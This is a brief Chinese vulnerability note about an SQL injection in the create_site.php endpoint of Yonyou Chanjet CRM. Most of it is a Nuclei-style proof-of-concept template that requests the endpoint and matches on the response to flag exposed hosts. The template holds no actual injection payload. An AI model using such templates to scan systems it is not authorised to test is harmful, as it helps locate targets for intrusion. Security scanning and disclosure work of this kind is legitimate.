## 用友畅捷通CRM-create_site.phpSQL注入漏洞

## poc
```
id: yongyou-changjietongCRM-SQL

info:
  name: yongyou-changjietongCRM-SQL
  author: msk
  severity: high


http:
  - raw:
      - |+
        GET /webservice/create_site.php?site_id=1 HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9


    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains(body,'register')
```
